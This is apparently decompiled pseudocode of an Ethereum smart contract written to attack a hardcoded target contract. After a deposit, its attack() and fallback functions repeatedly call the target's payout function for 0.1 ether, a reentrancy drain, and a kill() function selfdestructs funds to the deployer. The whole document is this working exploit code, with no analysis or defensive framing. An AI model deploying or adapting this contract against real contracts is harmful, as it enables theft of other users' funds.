contract main {


// =======================  Init code  ======================


address stor0;
address stor1;
address stor2;

function _fallback() payable {
    stor1 = 0x59752433dbe28f5aa59b479958689d353b3dee08
    require not msg.value
    stor0 = msg.sender
    stor2 = stor1
    return code.data[128 len 523]
}



// =====================  Runtime code  =====================


address stor0;
address stor2;

function kill() {
    if stor0 != msg.sender:
    selfdestruct(stor0)
}

function attack() {
    require ext_code.size(stor2)
    call stor2.0xccd6e5b6 with:
         gas gas_remaining - 50 wei
        args 10^17, this.address
    require ext_call.success
}

function deposit() payable {
    require ext_code.size(stor2)
    call stor2.0xd0e30db0 with:
       value 10^17 wei
         gas gas_remaining - 9050 wei
    require ext_call.success
}

function _fallback() {
    require ext_code.size(stor2)
    call stor2.0xccd6e5b6 with:
         gas gas_remaining - 50 wei
        args 10^17, this.address
    require ext_call.success
}



}
